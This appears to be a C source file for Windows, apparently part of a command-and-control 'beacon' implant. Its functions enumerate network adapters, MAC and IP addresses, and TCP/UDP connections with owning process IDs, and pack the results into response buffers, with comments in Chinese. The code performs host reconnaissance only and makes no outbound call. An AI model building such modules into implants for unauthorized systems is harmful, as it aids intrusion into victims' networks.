#include "beacon_commands.h"

#include <iphlpapi.h>
#include <iptypes.h>

#pragma comment(lib, "iphlpapi.lib")

/* 将大端序 32 位计数修补到输出缓冲区的前 4 个字节 */
static VOID NetPatchCount(ByteBuf* out, UINT32 count)
{
    if (out->len < 4) {
        return;
    }
    out->data[0] = (BYTE8)((count >> 24) & 0xffu);
    out->data[1] = (BYTE8)((count >> 16) & 0xffu);
    out->data[2] = (BYTE8)((count >> 8) & 0xffu);
    out->data[3] = (BYTE8)(count & 0xffu);
}

/* 将 MAC 地址格式化为冒号分隔的十六进制字符串 */
static VOID NetMacString(const IP_ADAPTER_ADDRESSES* adapter, CHAR* out, SIZE_T out_len)
{
    ULONG i;
    SIZE_T off = 0;

    if (out_len == 0) {
        return;
    }
    out[0] = 0;
    if (!adapter || adapter->PhysicalAddressLength == 0) {
        return;
    }

    for (i = 0; i < adapter->PhysicalAddressLength && off + 4 < out_len; ++i) {
        INT n = snprintf(out + off, out_len - off, "%s%02x", i ? ":" : "", adapter->PhysicalAddress[i]);
        if (n <= 0) {
            break;
        }
        off += (SIZE_T)n;
    }
}

/* 将单播地址转换为 CIDR 表示法字符串（如 "192.168.1.1/24"） */
static INT NetAddrString(const IP_ADAPTER_UNICAST_ADDRESS* unicast, CHAR* out, SIZE_T out_len)
{
    SOCKADDR* sa;
    DWORD prefix;
    CHAR ip[INET6_ADDRSTRLEN];

    if (!unicast || !unicast->Address.lpSockaddr || out_len == 0) {
        return 0;
    }
    out[0] = 0;
    ip[0] = 0;
    sa = unicast->Address.lpSockaddr;
    prefix = unicast->OnLinkPrefixLength;

    /* 将 IPv4 或 IPv6 地址转换为文本形式 */
    if (sa->sa_family == AF_INET) {
        SOCKADDR_IN* sin = (SOCKADDR_IN*)sa;
        if (!InetNtopA(AF_INET, &sin->sin_addr, ip, sizeof(ip))) {
            return 0;
        }
    } else if (sa->sa_family == AF_INET6) {
        SOCKADDR_IN6* sin6 = (SOCKADDR_IN6*)sa;
        if (!InetNtopA(AF_INET6, &sin6->sin6_addr, ip, sizeof(ip))) {
            return 0;
        }
    } else {
        return 0;
    }

    snprintf(out, out_len, "%s/%lu", ip, (unsigned long)prefix);
    return 1;
}

/* 检查适配器是否为软件回环接口 */
static INT NetIsLoopback(const IP_ADAPTER_ADDRESSES* adapter)
{
    return adapter->IfType == IF_TYPE_SOFTWARE_LOOPBACK;
}

/* 检查适配器是否为点对点（PPP）接口 */
static INT NetIsPointToPoint(const IP_ADAPTER_ADDRESSES* adapter)
{
#ifdef IF_TYPE_PPP
    if (adapter->IfType == IF_TYPE_PPP) {
        return 1;
    }
#endif
    return 0;
}

/* 检查适配器是否支持组播流量 */
static INT NetIsMulticast(const IP_ADAPTER_ADDRESSES* adapter)
{
#ifdef IP_ADAPTER_NO_MULTICAST
    return (adapter->Flags & IP_ADAPTER_NO_MULTICAST) == 0;
#else
    return 1;
#endif
}

/* 统计适用的接口标志数量（up、broadcast、loopback、ptp、multicast） */
static UINT32 NetFlagCount(INT is_up, INT is_loopback, INT is_point_to_point, INT is_multicast)
{
    UINT32 count = 0;
    INT is_broadcast = !is_loopback && !is_point_to_point;
    if (is_up) ++count;
    if (is_broadcast) ++count;
    if (is_loopback) ++count;
    if (is_point_to_point) ++count;
    if (is_multicast) ++count;
    return count;
}

/* 将接口标志作为字符串条目打包到输出缓冲区 */
static VOID NetPackFlags(ByteBuf* out, INT is_up, INT is_loopback, INT is_point_to_point, INT is_multicast)
{
    INT is_broadcast = !is_loopback && !is_point_to_point;
    if (is_up) PacketArrayString(out, "up");
    if (is_broadcast) PacketArrayString(out, "broadcast");
    if (is_loopback) PacketArrayString(out, "loopback");
    if (is_point_to_point) PacketArrayString(out, "point_to_point");
    if (is_multicast) PacketArrayString(out, "multicast");
}

/* 枚举网络接口并将详细信息打包到响应缓冲区 */
ByteBuf CommandNetinfo(VOID)
{
    ULONG size = 15000;
    IP_ADAPTER_ADDRESSES* addrs = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), 0, (size));
    ByteBuf out;
    UINT32 iface_count = 0;

    BbInit(&out);
    PacketArrayI32(&out, 0);

    /* 若初始缓冲区太小则重试分配 */
    if (!addrs || GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, addrs, &size) == ERROR_BUFFER_OVERFLOW) {
        HeapFree(GetProcessHeap(), 0, addrs);
        addrs = (IP_ADAPTER_ADDRESSES*)HeapAlloc(GetProcessHeap(), 0, (size));
    }
    if (!addrs || GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, addrs, &size) != NO_ERROR) {
        HeapFree(GetProcessHeap(), 0, addrs);
        return out;
    }

    /* 遍历适配器并打包接口信息 */
    {
        IP_ADAPTER_ADDRESSES* a;
        for (a = addrs; a; a = a->Next) {
            CHAR* name = WideToUtf8(a->FriendlyName);
            CHAR mac[3 * MAX_ADAPTER_ADDRESS_LENGTH];
            UINT32 addr_count = 0;
            IP_ADAPTER_UNICAST_ADDRESS* u;
            INT is_up = a->OperStatus == IfOperStatusUp;
            INT is_loopback = NetIsLoopback(a);
            INT is_point_to_point = NetIsPointToPoint(a);
            INT is_multicast = NetIsMulticast(a);

            NetMacString(a, mac, sizeof(mac));

            /* 统计单播地址数量 */
            for (u = a->FirstUnicastAddress; u; u = u->Next) {
                CHAR addr[128];
                if (NetAddrString(u, addr, sizeof(addr))) {
                    ++addr_count;
                }
            }

            /* 打包接口元数据 */
            PacketArrayI32(&out, (INT32)(a->IfIndex ? a->IfIndex : a->Ipv6IfIndex));
            PacketArrayString(&out, name ? name : "");
            PacketArrayI32(&out, (INT32)a->Mtu);
            PacketArrayI32(&out, (INT32)NetFlagCount(is_up, is_loopback, is_point_to_point, is_multicast));
            NetPackFlags(&out, is_up, is_loopback, is_point_to_point, is_multicast);
            PacketArrayString(&out, mac);

            /* 打包单播地址字符串 */
            PacketArrayI32(&out, (INT32)addr_count);
            for (u = a->FirstUnicastAddress; u; u = u->Next) {
                CHAR addr[128];
                if (NetAddrString(u, addr, sizeof(addr))) {
                    PacketArrayString(&out, addr);
                }
            }

            PacketArrayBool(&out, is_up);
            PacketArrayBool(&out, is_loopback);
            PacketArrayBool(&out, is_multicast);
            ++iface_count;
            HeapFree(GetProcessHeap(), 0, name);
        }
    }
    HeapFree(GetProcessHeap(), 0, addrs);

    /* 将接口数量修补到预留的头部槽位 */
    NetPatchCount(&out, iface_count);
    return out;
}

/* 将 TCP MIB 状态值转换为人类可读的字符串 */
static const CHAR* TcpState(DWORD s)
{
    switch (s) {
    case MIB_TCP_STATE_CLOSED: return "CLOSED";
    case MIB_TCP_STATE_LISTEN: return "LISTEN";
    case MIB_TCP_STATE_SYN_SENT: return "SYN_SENT";
    case MIB_TCP_STATE_SYN_RCVD: return "SYN_RECEIVED";
    case MIB_TCP_STATE_ESTAB: return "ESTABLISHED";
    case MIB_TCP_STATE_FIN_WAIT1: return "FIN_WAIT_1";
    case MIB_TCP_STATE_FIN_WAIT2: return "FIN_WAIT_2";
    case MIB_TCP_STATE_CLOSE_WAIT: return "CLOSE_WAIT";
    case MIB_TCP_STATE_CLOSING: return "CLOSING";
    case MIB_TCP_STATE_LAST_ACK: return "LAST_ACK";
    case MIB_TCP_STATE_TIME_WAIT: return "TIME_WAIT";
    case MIB_TCP_STATE_DELETE_TCB: return "DELETE_TCB";
    default: return "UNKNOWN";
    }
}

/* 枚举 TCP 和 UDP 连接并打包到响应缓冲区 */
ByteBuf CommandNetstat(VOID)
{
    DWORD size = 0;
    ByteBuf out;
    UINT32 conn_count = 0;

    BbInit(&out);
    PacketArrayI32(&out, 0);

    /* 枚举 TCP 连接 */
    GetExtendedTcpTable(NULL, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0);
    if (size) {
        BYTE8* buf = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, (size));
        if (buf && GetExtendedTcpTable(buf, &size, FALSE, AF_INET, TCP_TABLE_OWNER_PID_ALL, 0) == NO_ERROR) {
            MIB_TCPTABLE_OWNER_PID* t = (MIB_TCPTABLE_OWNER_PID*)buf;
            DWORD i;
            for (i = 0; i < t->dwNumEntries; ++i) {
                struct in_addr la, ra;
                CHAR l[64], r[64];
                la.S_un.S_addr = t->table[i].dwLocalAddr;
                ra.S_un.S_addr = t->table[i].dwRemoteAddr;
                InetNtopA(AF_INET, &la, l, sizeof(l));
                InetNtopA(AF_INET, &ra, r, sizeof(r));
                PacketArrayString(&out, "tcp");
                PacketArrayString(&out, l);
                PacketArrayI32(&out, (INT32)ntohs((u_short)t->table[i].dwLocalPort));
                PacketArrayString(&out, r);
                PacketArrayI32(&out, (INT32)ntohs((u_short)t->table[i].dwRemotePort));
                PacketArrayString(&out, TcpState(t->table[i].dwState));
                PacketArrayI32(&out, (INT32)t->table[i].dwOwningPid);
                ++conn_count;
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
    }

    /* 枚举 UDP 端点 */
    size = 0;
    GetExtendedUdpTable(NULL, &size, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0);
    if (size) {
        BYTE8* buf = (BYTE8*)HeapAlloc(GetProcessHeap(), 0, (size));
        if (buf && GetExtendedUdpTable(buf, &size, FALSE, AF_INET, UDP_TABLE_OWNER_PID, 0) == NO_ERROR) {
            MIB_UDPTABLE_OWNER_PID* t = (MIB_UDPTABLE_OWNER_PID*)buf;
            DWORD i;
            for (i = 0; i < t->dwNumEntries; ++i) {
                struct in_addr la;
                CHAR l[64];
                la.S_un.S_addr = t->table[i].dwLocalAddr;
                InetNtopA(AF_INET, &la, l, sizeof(l));
                PacketArrayString(&out, "udp");
                PacketArrayString(&out, l);
                PacketArrayI32(&out, (INT32)ntohs((u_short)t->table[i].dwLocalPort));
                PacketArrayString(&out, "");
                PacketArrayI32(&out, 0);
                PacketArrayString(&out, "UNCONN");
                PacketArrayI32(&out, (INT32)t->table[i].dwOwningPid);
                ++conn_count;
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
    }

    /* 将总连接数修补到头部槽位 */
    NetPatchCount(&out, conn_count);
    return out;
}
